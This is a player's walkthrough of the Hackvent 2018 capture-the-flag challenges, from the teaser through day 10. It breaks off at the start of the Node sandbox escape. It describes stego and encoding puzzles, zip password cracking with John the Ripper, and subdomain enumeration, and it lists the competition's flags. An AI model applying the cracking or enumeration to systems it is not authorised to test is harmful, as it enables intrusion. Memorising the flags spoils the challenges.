# Hackvent 2018

## Teaser
### Teaser.png
The first image [Teaser.png](teaser/Teaser.png) shows dots that look like a QR code. However, the edges are missing, so it could not even be DotCode.  
After some search, I thought it might be Braille and I was able to decode the image using different translation tables in the internet to a new URL: http://bit.ly/2TJvxHt  
There is another dot QR code [Flag_Stage_1.png](teaser/Flag_Stage_1.png), but this time you can read it and it says "Rushed by ..."  
After looking at the Network traffic, you see that the bit.ly URL does redirect to a page https://hackvent.hacking-lab.com/T34s3r_MMXVIII/index.php?flag=UI18-GAUa-lXhq-htyV-w2Wr-0yiV  
There is a Flag! However, it does not start with HV18 but with UI18?  
Ahh, Rot13 :) And you get the *first* flag **HV18-TNHn-yKud-uglI-j2Je-0lvI**

Now enter this flag also in the URL https://hackvent.hacking-lab.com/T34s3r_MMXVIII/index.php?flag=HV18-TNHn-yKud-uglI-j2Je-0lvI and you get a PDF file [ZOoxjUSe1OVB7OPoVrsX.pdf](teaser/ZOoxjUSe1OVB7OPoVrsX.pdf).

After downloading the PDF file, I used `binwalk -e ZOoxjUSe1OVB7OPoVrsX.pdf` to extract the data inside. There is already some interesting QR code with colors [QR3C.png](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/QR3C.png), a [Santa.txt](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/Santa.txt) file containing some text and a zip archive [final.zip](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/final.zip) which seems to be password protected.

### PDF file (code)
If you open the PDF and press STRG+A (Select All), you see that there is something (text?) below the image. To extract it, I used *ghostscript*: `gs -sDEVICE=txtwrite -o output.txt ZOoxjUSe1OVB7OPoVrsX.pdf`.  
After looking at the output, this looks very much like morse code! Decoding it on the website https://gc.de/gc/morse you get the *second* flag **HV18-GORI-ZRSB-UFAE-TS6C-CVTT** (needs to be converted to all uppercase letters).

### PDF Background image
Additionally `pdfimages -all ZOoxjUSe1OVB7OPoVrsX.pdf pdf_img` extracts three images from the PDF and there is one that looks suspicious: [pdf_img-001.png](teaser/pdf_img-001.png). `binwalk` and `steghide` does not show anything inside this file. But the file itself looks very interesting..  
Using `Stegsolve` with the file and the *Stereogram Solver*, the image transforms to a QR code at offset 72.  
Save this image and open in GIMP. First step would be using a threshold filter based on the Luminance to get a black/white image. Afterwards you could either fix the code manually (removing all the flickering) or use some other filters.  
Then scale the QR image to a square one and you should be able to read the *third* flag **HV18-p2LK-DNcI-YKw7-T9Ad-mH3v**

### 39A25.rar
**Note: This is only in the first PDF and has been removed in the later one as there are hints added to the Santa.txt directly**  
A friend told me to take a deeper look at the enclosed RAR [39A25.rar](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25.rar) file. Using `binwalk` I did not find anything special. So I tried `unrar l 39A25.rar` to show the files, without luck. After reading the help of `unrar`, I saw there are more flags to be used. I tried the full set `unrar ltab 39A25.rar` and now you see two additional parts that were hidden before!  
```
        Name: STM
        Type: NTFS alternate data stream
      Target: :Hint.jpg
        Size: 28263
 Packed size: 26798
       Ratio: 94%
       mtime: 2018-11-28 10:28:10,000000000
  Attributes: .B
       CRC32: 70D8473B
     Host OS: Windows
 Compression: RAR 3.0(v29) -m3 -md=64K

        Name: STM
        Type: NTFS alternate data stream
      Target: :Hint.txt
        Size: 33
 Packed size: 39
       Ratio: 118%
       mtime: 2018-11-28 10:28:10,000000000
  Attributes: .B
       CRC32: EEE75B3F
     Host OS: Windows
 Compression: RAR 3.0(v29) -m3 -md=64K
```
A quick google search showed that those NTFS alternate data streams are a very strange feature of the NTFS file system. It is a kind of a fork on file system level, you can have a single file with multiple versions inside which you wont see in explorer (I know why I dont use NTFS!). RAR seems to be the only archiver which can store those..  
So I booted up my Windows machine, installed WinRAR, extracted the archive and used the `streams` tools from sysinternals (https://docs.microsoft.com/en-us/sysinternals/downloads/streams) to check whether the streams have been extracted and to which file they belong.
```
streams64.exe Santa.txt

streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

39A25\Santa.txt:
        :Hint.jpg:$DATA 28263
        :Hint.txt:$DATA 33
```
There are two files hidden behind *Santa.txt*, to view them, simply add the name behind the file name to access them.  
* `notepad.exe Santa.txt:Hint.txt`: [Hint.txt](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/Hint.txt)  
This pretty much tells us to check the other reindeer names I guess, which are: Dasher, Dancer, Prancer, Vixen, Comet, Cupid, Dunder (variously spelled Donder and Donner) and Blixem (variously spelled Blixen and Blitzen). I guess those could be the key !?
* `mspaint.exe Santa.txt:Hint.jpg`: [Hint.jpg](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/Hint.jpg)  
This shows two dices both displaying 6 dots. Maybe this is a hint on the used cipher?

#### Santa.txt
In the old version of the PDF, the [Santa.txt](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/Santa.txt) was there without comment and if you look at the RAR archive above, it had two hints:
* [Hint.txt](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/Hint.txt): "Rudolph is not really one of them", so most likely it has something to do with Santa's reindeers. A quick search gives us the names: Dasher, Dancer, Prancer, Vixen, Comet, Cupid, Dunder (variously spelled Donder and Donner) and Blixem (variously spelled Blixen and Blitzen).
* [Hint.xcf](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/Hint.xcf): (Is in the RAR as jpg) shows two dices both with the number 6 on top. This could mean something with 6, 66, 12, doublets / double. I think it might be a hint on the used algorithm, but I could not think of one that would fit. The "dice" ciphers I found are quite complicated or use dice symbols for "encoding"..

In the **updated PDF** they changed [Santa.txt](teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/Santa.txt) to include further hints. Now its clear that the reindeer names are the keys and the spelling is now also clear. But still the cipher algorithm is unclear (to me).. It has to be something that is rather simple, still secure and does not necessarily require a complicated tooling, so I started searching for classic symmetric ciphers that are secure and after some time and probing, I found the "Double Transposition Cipher" which is still deemed quite secure against crypto analysis etc.  
You can use CrypTool to do the decryption and try all the key combinations... However, I also tried some online decoders which all failed! dcode.fr removes the spaces and dashes so the output could not be right..  
In CrypTool 1, open a new document, enter the encrypted message, then go to "Encrypt/Decrypt" -> "Symmetric (classic)" -> "Permutation / Transposition". Then use one name as 1st Permutation key with the settings "line by line: Input" and "column by column: Permute, Output", second name as 2nd Permutation key with the same settings. Input document is "Text".  
After some time, Donder/Blitzen are the right keys and you get the flag: **HV17-NORT-HPOL-EMAI-NSTA-TION**

#### quickresponse.txt
**Note: The following is only true for the updated PDF**  
After they released the updated PDF version, I tried extrating the same stuff as I did before, but now the two hint files are no longer hidden inside the RAR file, but there is a new one hidden in the same way:
```
        Name: STM
        Type: NTFS alternate data stream
      Target: :quickresponse.txt
        Size: 625
 Packed size: 142
       Ratio: 22%
       mtime: 2018-12-03 02:15:08,000000000
  Attributes: .B
       CRC32: 993E3536
     Host OS: Windows
 Compression: RAR 3.0(v29) -m3 -md=64K
```
There is a file *quickresponse.txt* hidden in *old_school.jpg*, so I used the same method as above to extract it and got [quickresponse.txt](/home/hacker/ctf/hackvent2018/teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/quickresponse.txt).  
The first thing I tried was converting the 1s and 0s to ASCII, but this is only garbage. Then I remembered that "quickresponse" is the full name of QR in QR-Code!  
If you split the binary string every 25 characters, you see that this forms a QR code. So I used some regex magic to add ; delimiters between the numbers and newlines after 25 characters and stored this as a CSV [file](/home/hacker/ctf/hackvent2018/teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/quickresponse.csv). Opened this in excel, made the columns and rows a similar width/height and added conditional formatting to format every cells with 0 to have white text on white background and cells with 1 to have black text on black background (see [file](/home/hacker/ctf/hackvent2018/teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A25/quickresponse.xlsx)). Then you can read the QR code to get the flag **HV18-Idwn-whWd-9sNS-ScwC-XjSR**.

### final.zip
Lets take a look at the password protected zip archive.. I used John The Ripper to brute force the password (which was quite easy, as it is only one character).  
```
zip2john final.zip > zip.hash
john zip.hash
john --show zip.hash
unzip -P "F" -d . -o final.zip
```
So it seems that there a multiple zip archives stacked.. If you redo the steps (using *z.zip*), it will always overwrite the current one in the directory. You quickly see that the characters form words and sentences. Googling them will find some pages that contain those words and the following ones, so I started manually and tried to use the found sentences to speed up the unpacking.  
However, after around 50 to 100 layers, I wrote a script [auto-unpack.py](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A67/auto-unpack.py) which brute forces the password and unpacks the zip.  
After some time the script stopped and the last four found characters were *HV18*, yes there is the flag! It seems to be that you cannot give the password "-" to unzip via command line, so you have to do this manually `unzip -d . -o z.zip` and enter "-" in the password prompt. The flag is **HV18-WO3y-7FLk-ExvN-kDue-28JF**  
But afterwards there is still a password protected zip there, so I let my script running for some time until I finally found the content of the zip: [xenon.elf32](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A67/xenon.elf32) which looks very much like reverse engineering.. (a little hard for a teaser, isn't it?).

The complete password for all zip files can be found below (Please not that it has to be entered one character at a time.):
```
Far shed each high read are men over day. Afraid we praise lively he suffer family estate is. Ample order up in of in ready. Timed blind had now those ought set often which. Or snug dull he show more true wish. No at many deny away miss evil. On in so indeed spirit an mother. Amounted old strictly but marianne admitted. People former is remove remain as. Sudden looked elinor off gay estate nor silent. Son read such next see the rest two. Was use extent old entire sussex. Your nugget ist HV18-WO3y-7FLk-ExvN-kDue-28JF. All men drew its post knew. Of talking of calling however civilly wishing resolve. Eat imagine you chiefly few end ferrars compass. Be visitor females am ferrars inquiry. Latter law remark two lively thrown. Spot set they know rest its. Raptures law diverted believed jennings consider children the see. Had invited beloved carried the colonel. Occasional principles discretion it as he unpleasing boisterous. She bed sing dear now son half. Congratulations, you have reached the last level.
```

### QR3C.png
The picture shows a QR code with additional colors. First idea I had was to modify the image to get a valid QR code, so I used GIMP to apply threshold, filters, etc. but the QR code was never readable. After some research, this is obvious because the sync patterns are completely missing and also the error correction part has been wiped out..  
After some further searches, I found an older hackvent challenge from 2015 which was similar. It basically says that this image consists of three interleaved QR codes, one for each color channel which misses the information for QR code readers to decode it. They did it manually and there were some good pages mentioned to learn about the QR code. I used:
- (https://en.wikipedia.org/wiki/QR_code#/media/File:QR_Format_Information.svg) to identify the masking pattern (in this case 3).
- (https://en.wikipedia.org/wiki/QR_code#/media/File:QR_Character_Placement.svg) to see how the decoding works for a QR code.
- (https://www.thonky.com/qr-code-tutorial/introduction) which has many information about the encodings, masking, etc.

With all these sources, I wrote a script [qr_decode.py](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/QR3C/qr_decode.py) (that reads the QR code and uses the color channels to decode them. A thing that took me quite some time (I always had decoding errors) was that if the color channel is 255, this equals white, so "0" and not "1" like I thought it would be.. The flag is encoded in the three color channels and then just concatenated to **HV18-3I5a-Rnrl-s28r-SRHj-Lhzx**

### teaser.pls
In the **updated** verion of the PDF file, there is a new file [teaser.pls](teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/teaser.pls), which looks like programming code with maybe base32/64 encoding at the end? The first line looks suspicious like a Database query..  
If you enter "CREATE OR REPLACE FUNCTION wrapped" in Google you quickly find a page from Oracle showing how to produce "secure" wrapped database functions (https://docs.oracle.com/cd/B28359_01/appdev.111/b28370/wrap.htm#LNPLS016). A small search for "oracle unwrap" brought me to (https://www.codecrete.net/UnwrapIt/) which will nicely unwrap our file to
```
FUNCTION checkHV18teaser(FLAG VARCHAR2) RETURN NUMBER IS
	A VARCHAR2(4);
	B NUMBER(10);
	C NUMBER(10);
	H VARCHAR(40);
BEGIN
	A := SUBSTR(FLAG,1,4);
	IF NOT (A = 'HV18') THEN
		RETURN 0;
	END IF;

	B := TO_NUMBER(SUBSTR(FLAG,6,2));
	C := TO_NUMBER(SUBSTR(FLAG,8,2));
	IF NOT (((B * C) = 6497) AND (B < C)) THEN
		RETURN 0;
	END IF;

	A := SUBSTR(FLAG,11,4);
	SELECT STANDARD_HASH(A, 'MD5') INTO H FROM DUAL;
	IF NOT (H = 'CF945B5A36D1D3E68FFF78829CC8DBF6') THEN
	RETURN 0;
	END IF;

	IF NOT ((UTL_RAW.CAST_TO_VARCHAR2(UTL_RAW.BIT_XOR (UTL_RAW.CAST_TO_RAW(SUBSTR(FLAG,16,4)), UTL_RAW.CAST_TO_RAW(SUBSTR(FLAG,21,4)))) = 'zvru') AND (TO_NUMBER(SUBSTR(FLAG,21,4)) = SQRT(8814961))) THEN
		RETURN 0;
	END IF;

	IF NOT ( UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(SUBSTR(FLAG,26,4)))) = 'RjBtMA==') THEN
		RETURN 0;
	END IF;

	DBMS_OUTPUT.PUT_LINE(A);
	RETURN 1;
END;
```
So, if you check the code, this function seems to verify a flag that has been given as a parameter. So lets reverse the steps done by the verification:
1. `A := SUBSTR(FLAG,1,4); IF NOT (A = 'HV18')` simply checks whether the first four characters are equal to *HV18*
2. There are two numbers, each two numbers long and an equation that has to be fulfilled `IF NOT (((B * C) = 6497) AND (B < C))`, with a small script [numbers.py](teaser/update/numbers.py), you find *B=73* and *C=89*
3. A 4 character word with an md5 hash of `CF945B5A36D1D3E68FFF78829CC8DBF6`. I used (https://hashkiller.co.uk/md5-decrypter.aspx) and instantly got *H0b0*
4. The next condition combines two parts, at first we are searching for `SQRT(8814961)` which is *2969* (this is the later part, the second step comes first in the flag, see the substring starting numbers), then we take do `BIT_XOR (SUBSTR(FLAG,16,4), SUBSTR(FLAG,21,4))) = 'zvru')`, so its easy to revers an XOR, we just take *2969* as ASCII characters, convert them to hex and XOR with the hex representation of *zvru* to get *HODL*
5. Last part is a comparison with a base64 encoded value, so just base64 decode it to get *F0m0*

Combine them together to get the flag **HV18-7389-H0b0-HODL-2969-F0m0**

### old_school.jpg
In the **updated** version of the PDF there is a new file [old_school.jpg](teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/old_school.jpg) which shows one of those old punch cards used to write computer programs. On the bottom right side, there is the name of the machin *IBM-029*, so I searched for "IBM-029 punch card" and found a good page with a card showing the encoding (http://www.columbia.edu/cu/computinghistory/026.html). So you go column by column and decode the data. It starts with *O2Z-H4PAL52Z4-F19-* and then there is the flag **HV18-0LD$-SCH0-0L1S-4W3S-0Me!**. Afterwards I was not able to decode all the characters, so I stopped here.

### xenon.elf
*Many thanks to daubsi for helping me with this one*  
After unpacking all stacked zips inside [final.zip](#final.zip), there is a binary [xenon.elf32](teaser/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/39A67/xenon.elf32). *Note: There is an easier version in the second update and this section is made with the easier version*. Please see [xenon.elf](teaser/update/_ZOoxjUSe1OVB7OPoVrsX.pdf.extracted/xenon/xenon.elf)  
The first thing I checked was `strings xenon.elf` and there are already some interesting lines:  
```
HackVent 2018
DrSchottky wishes you happy Holy(0)days
I wish I was a Devkit :(
```
After a little search, I found out that this is most likely a binary for XBox360 and I assume that the application will only work as expected (aka showing the flag) when it thinks that it is running inside a development version. Using the nice decompiler from Avast (https://github.com/avast-tl/retdec), there is already a crypto function visible `rc4_crypt`. The difference between retail/production and development XBox units were the value of fuseline 0 and 1 (https://github.com/Free60Project/wiki/blob/master/Fusesets.md):  
```
       fuseset 00: C0FFFFFFFFFFFFFF
Retail fuseset 01: 0F0F0F0F0F0F0FF0
Devkit fuseset 01: 0F0F0F0F0F0F0F0F
```
And those values are read in `main`:  
```
xenon_secotp_read_line(0);
xenon_secotp_read_line(1);
```
But the fuse values are not used directly, they are altered before they are used as a key. After the transformation, the key is `C00FFF0FFF0FFF0FFF0FFF0FFF0FFF0F`. The ciphertext is also loaded in the main function (only ciphertext relevant parts):
```
char ciphertext[40];
char v1[40];
v1[0] = -33;
ciphertext = v1;
```
So we know that the ciphertext starts with -33 (decimal) which is 0xDF in the hexadecimal form of the two's complement of 33. Searching through the .rodata segment using `objdump -s -j .rodata xenon.elf` shows that the beginning of the segment directly starts with 0xDF. Taking the first 40 bytes of the .rodata section to get the ciphered flag as `df6658c0 5e93c8d4 c4e95e36 b155144a be83c90a dc2bc5f0 8fabbbac 49dd0f01 8001ea40 97f6668b 07a0b443`.  
Now we can use CyberChef to decrypt and decode the ciphered flag (https://gchq.github.io/CyberChef/#recipe=RC4(%7B'option':'Hex','string':'C00FFF0FFF0FFF0FFF0FFF0FFF0FFF0F'%7D,'Hex','Latin1')From_Base64('A-Za-z0-9%2B/%3D',true)&input=REY2NjU4QzA1RTkzQzhENEM0RTk1RTM2QjE1NTE0NEFCRTgzQzkwQURDMkJDNUYwOEZBQkJCQUM0OUREMEYwMTk3RjY2NjhCMDdBMEI0NDM).  
The flag is **HV18-LIBX-ENON-ISST-ILLA-LIVE**

## Day 1
**Just Another Bar Code**  
After a decade of monochromity, Santa has finally updated his infrastructure with color displays.  
With the new color code, the gift logistic robots can now handle many more gifts:
[HV18_Ball_Day1_color.png](day01/HV18_Ball_Day1_color.png)

First, I was immediately reminded of the QR3C images that was there in the teaser. So I started to try to decode the single bits by RGB values (three bits per block) but got nothing that made sense. Also I was not able to modify the picture in any way (threshold, filter, ...) that a valid QR code came out..  
After some time, I sat back and thought, this is the first day, an easy challenge, you should not decode QR codes manually, it has to be much easier. So I started googling for the picture (image search) and then for the text on the page. And after searching for *Just Another Barcode*, you see that this is actually the name of a barcode format *JAB code*. Crop the image [QR.png](day01/QR.png) and upload it on (https://jabcode.org/scan/) to reveal the flag: **HV18-L3ts-5t4r-7Th3-Phun-G33k**

## Day 2
**Me**  
*Lost in translation*  
Can you help Santa decoding these numbers?

```
115 112 122 127 113 132 124 110 107 106 124 124 105 111 104 105 115 126 124 103 101 131 124 104 116 111 121 107 103 131 124 104 115 122 123 127 115 132 132 122 115 64 132 103 101 132 132 122 115 64 132 103 101 131 114 113 116 121 121 107 103 131 124 104 115 122 123 127 115 63 112 101 115 106 125 127 131 111 104 103 115 116 123 127 115 132 132 122 115 64 132 103 101 132 132 122 115 64 132 103 101 131 114 103 115 116 123 107 113 111 104 102 115 122 126 107 127 111 104 103 115 116 126 103 101 132 114 107 115 64 131 127 125 63 112 101 115 64 131 127 117 115 122 101 115 106 122 107 107 132 104 106 105 102 123 127 115 132 132 122 116 112 127 123 101 131 114 104 115 122 124 124 105 62 102 101 115 106 122 107 107 132 104 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131 63 105 115 126 124 107 117 115 122 101 115 106 122 107 113 132 124 110 107 106 124 124 105 111 104 102 115 122 123 127 115 132 132 122 115 64 132 103 101 131 114 103 115 116 123 107 117 115 124 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131 63 105 115 126 124 107 117 115 122 101 115 106 122 107 107 132 104 106 105 102 121 127 105 132 114 107 115 64 131 127 117 115 122 101 115 112 122 127 111 132 114 107 105 101 75 75 75 75 75 75
```
First I tried to convert the numbers to ASCII on (https://www.dcode.fr/ascii-code). You see that it is most probably the OCT (N digits) ASCII encoding, because you get:
```
MJRWKZTHGFTTEIDEMVTCAYTDNIQGCYTDMRSWMZZRM4ZCAZZRM4ZCAYLKNQQGCYTDMRSWM3JAMFUWYIDCMNSWMZZRM4ZCAZZRM4ZCAYLCMNSGKIDBMRVGWIDCMNVCAZLGM4YWU3JAM4YWOMRAMFRGGZDFEBSWMZZRNJWSAYLDMRTTE2BAMFRGGZDJNQQGOMLHGIQGCY3EMVTGOMRAMFRGKZTHGFTTEIDBMRSWMZZRM4ZCAYLCMNSGOMTJNQQGOMLHGIQGCY3EMVTGOMRAMFRGGZDFEBQWEZLGM4YWOMRAMJRWIZLGEA======
```
This again looks like baseX encoding (because of the = at the end), so lets try [base32](https://www.dcode.fr/base-32-encoding), [base64](https://www.dcode.fr/base-64-coding) and [base85](https://www.dcode.fr/ascii-85-encoding). With base32 you get something the looks ok:
```
bcefg1g2 def bcj abcdefg1g2 g1g2 ajl abcdefm ail bcefg1g2 g1g2 abcde adjk bcj efg1jm g1g2 abcde efg1jm acdg2h abcdil g1g2 acdefg2 abefg1g2 adefg1g2 abcdg2il g1g2 acdefg2 abcde abefg1g2 bcdef
```
After staring at the code for some time, it becomes quite clear that *g1g2* has to be "-", because it appears always after four groups, so we have the encoded/encrypted flag right in front of us! I assumed that *bcefg1g2* will be "H", *def* will be "V", *bcj* will be 1 and *abcdefg1g2* will be 8, but I couldn't get the meaning of this encoding..

Next step was starting to google for the code and if you only enter the first word, I found some geocaching pages, so this code seems to be used for other games as well.. This didn't help me, there were no hints or decoders.. After some time, I googled *acdg2h* and look at the first match! 14 segment displays!  
Each segment has its name, a-m and there are two times g, g1 and g2.  
Enter the text on the page (http://kryptografie.de/kryptografie/chiffre/14-segment.htm) to get the flag: **HL18-7QTH-JZ1K-JKSD-GPEB-GJPU** (Note: this time it is not HV18 but HL18. The 14 segment display cannot show a "V" :) ).

## Day 3
**Catch me**  
*... if you can*  
To get the flag, just press the button  
(https://hackvent.hacking-lab.com/C4tchM3_dizzle/), see [index.html](day03/index.html)

The button on this page is not really clickable, because it jumps around, so lets have a look at the page source code. At the end you will find a JavaScript that is obfuscated, so lets de-obfuscate it. I used (http://jsnice.org/) for this, just enter the source on the left, click "Nicify" and you see the flag **HV18-pFAT-O1Dl-HjVp-jJNE-Zju8**

## Day 4
**pirating like in the 90ies**  
*Ahoy, my name is Santa and I want to be a pirate!*

You see a page with strange faces an input boxes below. From the page source, you see there is an encrypted flag and it is XORed with what you enter in those input boxes. Furthermore from the DOM, you see the names (e.g. Nebraska) have a div class "year", so I assume we have to enter years in those boxes.  
After searching a little around, I checked the 90ies pirate games and which is quite famous? "The secret of monkey island" with Guybrush Threepwood :)  Searching "secret of monkey island nebraska" shows a (german) wiki page where they mention the copyright mechanism that was used back then; they called it "Dial-a-pirat". Ahh, now I remember. This was a wheel were you can puzzle pirate faces together and then you got numbers to unlock the game!  
Searching for "Dial-a-pirate" leads you to this nice page (http://www.oldgames.sk/codewheel/secret-of-monkey-island-dial-a-pirate) where you can rebuild the faces from the page. The bottom parts are not so good to read (on the wheel), so look carefully. After entering the correct years, it will reveal the flag **HV18-5o9x-4geL-7hkJ-wc4A-xp8F**

## Day 5
**OSINT 1**  
*It's all about transparency*  
Santa has hidden your daily present on his server, somewhere on port 443.  
Start on (https://www.hackvent.org) and follow the OSINT traces.

When you go to that page see [index.html](day05/index.html). It says that you are at the right place, but on the wrong virtual host. If you use another subdomain, you see the same page, so its about finding the correct subdomain for the flag.  
I checked the domain certificate at first whether this contains additional subdomains, but there is only the www.hackvent.org one inside.  
**Alternative, maybe the intended way (due to the transparency hint)**  
On the page from Let's Encrypt, there is a part about transparency (https://letsencrypt.org/certificates/) and they say, that all certificate request which they sign. You can view those logs at (https://crt.sh/). So if you just search for "%.hackvent.org", you directly find the subdomain, see (https://crt.sh/?q=%25.hackvent.org).

**My initial way**  
Afterwards, I did a DNS lookup using `host hackvent.org` and got this output:
```
host hackvent.org
hackvent.org has address 80.74.140.188
hackvent.org mail is handled by 20 mail.hackvent.org.
hackvent.org mail is handled by 10 mail.hackvent.org.
```
But on those two mail subdomains there is nothing. Next idea was to use another DNS tool to check for additional subdomains (I omitted much of the output):
```
dnsrecon -d www.hackvent.org -a -s -g -b -k -w -t std,rvl,srv,axfr,goo,bing,crt,snoop,tld,zonewalk -z
[*] Performing General Enumeration of Domain:www.hackvent.org
[!] Wildcard resolution is enabled on this domain
[!] It is resolving to 80.74.140.188
[!] All queries will resolve to this address!!
[*] Performing Bing Search Enumeration against www.hackvent.org
[*] 	 A 3Awww.hackvent.org 80.74.140.188
[*] 	 A 3awww.hackvent.org 80.74.140.188
[*] 	 A 253awww.hackvent.org 80.74.140.188
[*] 	 A 253Awww.hackvent.org 80.74.140.188
[+] 4 Records Found
```
But on those two additional subdomains, there is also nothing of interest..  
Ok, what else could we do? There is a method to see some kind of "archive" of the DNS queries and responses, which is called passivedns. You can use this website (https://passivedns.mnemonic.no/) to do a passivedns lookup. Searching for the domain "hackvent.org" yields three IP addresses, now we search for the main IP address "80.74.140.188" and see additional subdomains!
* hackvent.org
* www.hackvent.org
* osintiscoolisntit.hackvent.org
* whale.hacking-lab.com
* sulaco.dreamlab.net
* urb80-74-140-188.ch-meta.net

The third one looks really suspicious, when you have the challenge title in mind! Surf on this subdomain to get the flag **HV18-0Sin-tI5S-R34l-lyC0-oo0L**

## Day 6
**Mondrian**  
Piet'er just opened his gallery to present his pieces to you, they'd make for a great present :)  
(https://hackvent.hacking-lab.com/Mondrian-Gallery/)

Piet Mondrian was a dutch painter who created a new abstract art style reduced to simple geometric elements. When you search for "Mondrian code", you find a wiki page about "Piet" as a programming language. The interpreter takes images as input and "runs" them (http://www.dangermouse.net/esoteric/piet.html). You can find several interpreters on this side (http://www.dangermouse.net/esoteric/piet/tools.html) and a online version at (https://www.bertnase.de/npiet/npiet-execute.php) which sometimes has problems when multiple people are using it in parallel.  
I downloaded *npiet* (https://www.bertnase.de/npiet) to "run" those images, had to install *libgd-dev* and *groff*. Afterwards you can run `npiet house.png` which prints "HV18" forever. So lets stop after some time with `npiet -e 1000 house.png`. This stops after a maximum of 1000 steps to avoid this endless loop. (In fact, -e 70 is enough, for the last one, you need at least 80 steps though)
* [house.png](day06/house.png) -> HV18
* [trees.png](day06/trees.png) -> M4ke
* [lake.png](day06/lake.png) -> S0m3
* [sky.png](day06/sky.png) -> R3Al
* [sheep.png](day06/sheep.png) -> N1c3
* [snake.png](day06/snake.png) -> artZ

This leads to the flag **HV18-M4ke-S0m3-R3Al-N1c3-artZ**

## Day 7
**flappy.pl**  
Time for a little game. It's hardy obfuscated, i promise ... ;-)  
(https://hackvent.hacking-lab.com/flappy.pl.txt)

After downloading the file [flappy.pl.txt](day07/flappy.pl.txt) the first idea was to simply run it `perl flappy.pl.txt`. It prints a nice output animation and ends soon. Already the characters H and V are visible, so it seems that this script directly prints the flag?  
Ok, lets "beautify" the scritpt (if you could call this beautiful for perl) to get a better readable version [flappy.pl.pretty](day07/flappy.pl.pretty). Nothing obvious here, the flag seems to be hidden pretty well. Lets focus on patching the script that it prints the flag for us..  
The name of the file "flappy" and parts of the script (e.g. ReadKey) looks like this could really be a game similar to flappy bird. So can we control the "@" in the output and the path it takes? I mashed on the keyboard until I found the key which the script reacts to, its the space bar :) Like in flappy bird, you hit the space bar more often to move the "bird" to the right and it will automatically go back to the left. As soon as it touches the # borders or the flag characters (you have to hit the blank area), the game ends. I was not able to go further than "HV18-", so back to the script to patch it ;)  
After some deeper looks in the code, I found two parts that look suspicious:
* Line 29: `( $x > 1 && $x < 80 ) || last;`: This checks if x is between 1 and 80, which could very likely be the check if you hit the boundaries on the left and right!  
So `last` seems to be our end criteria
* Line 42: `( ( $i + 13 ) % 23 ) ? 42 : ( ( abs( $x - $h ) < 6 ) || last );`: This one checks whether you made it through the hole in the flag (which is 6 characters wide).

Commenting out both lines and you are able to run the script without doing anything. The flag reads **HV18-bMnF-racH-XdMC-xSJJ-I2fL**

## Day 8
**Advent Snail**  
In cyberstan there is a big tradition to backe advents snails during advent.
[4dv3ntSn4il.png](day08/4dv3ntSn4il.png)

Ok, from the title, a snail has its snail house, so I guess the picture has to be encoded in a circular fashion, either from the outside going to the inside or the other way round. There are most likely two possibilities, either we have simple bits (black = 1, white = 0) that decode to ASCII characters directly, or this could also be a QR code (25x25).  
First thing was to extract the interesting part of the picture, simply by cropping. You see that the black boxes are a little blurry on the outside, so I additionally applied a Threshold filter to get clear black and white boxes.  
After looking at the bits, this does not really look like decodable ASCII, so lets try the QR Code approach.  
When starting from the middle pixel (12, 12) (zero indexed), you then go up, right, down, left, up, ... and get a full QR code. Please see my script [de_snail.py](day08/de_snail.py) on how I did it. Run it to get the flag **HV18-$$nn-@@11-LLr0-B1ne**

## Day 9
**fake xmass balls**  
A rogue manufacturer is flooding the market with counterfeit yellow xmas balls.They are popping up like everywhere!  
Can you tell them apart from the real ones? Perhaps there is some useful information hidden in the fakes...  
[medium-64.png](day09/medium-64.png)

The first things I checked was using *binwalk*, *foremost*, *exiftool*, *steghide* and everything else that came to my mind to hide stuff inside pictures. Then I read again the challenge description and I guess you need to have two ball images, one that is "real" and the other one that is "fake". Looking at the challenge page, there is another ball image right next to the challenge description (as always): [original.png](day09/original.png). The image has a different size and also the path is different (one is in the main folder, the other one in the /img/ subfolder).  
But also on this ball, there is also nothing hidden inside..  
Next try was to use *Steghide*, load one of the ball images, then use "Analyse" > "Image Combiner" with the second image. When you move right until the "SUB" method, you see a strange pixel picture showing up, this looks like part of a QR code! Save the image. [solved.bmp](day09/solved.bmp) and [solved2.bmp](day09/solved2.bmp)  
Then do the same task the other way round (loading initially the other image and the second one in the "Image Combiner") to get a second "SUB" image.  
Afterwards, I loaded both images in GIMP, used the Threshold filter to get the green images to black, combine both of them to one image and inverted the color to get a readable QR code [qr.xcf](day09/qr.xcf) with the flag: **HV18-PpTR-Qri5-3nOI-n51a-42gJ**

## Day 10
**>_ Run, Node, Run**  
Santa has practiced his nodejs skills and wants his little elves to practice it as well, so the kids can get the web- app they wish for.  
He made a little practice- sandbox for his elves. Can you break out?  
Location: (http://whale.hacking-lab.com:3000/)

On the linked webpage, you can run your JavaScript code and access the pages source to see what happens behind the scenes [code](day10/code).  
Taking a look at the very small code, they use a Node server with a sandbox where your entered code is running: `new sandbox().run(boiler + req.body.run, (out) => res.json({success: true, result: out.result}));`.  
The flag seems to be stored on the file system `const {flag, port} = require("./config.json");` and it is given to the Sandbox but with a unique and random variable name.  
